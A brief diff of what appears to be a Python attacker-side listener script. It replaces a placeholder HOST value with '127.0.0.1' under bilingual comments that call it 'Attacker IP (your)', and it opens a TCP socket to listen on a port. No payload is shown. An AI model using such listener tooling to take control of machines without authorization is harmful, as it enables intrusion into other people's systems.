@@ -10,7 +10,7 @@ main_logo = r'''
 print(main_logo)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-HOST = 'IP'  # Attacker IP (your) / Айпи атакующего (Ваш)
+HOST = '127.0.0.1'  # Attacker IP (your) / Айпи атакующего (Ваш)
 
 # Check if port to listen was entered / Проверка был ли введен порт для прослушивания
 try:
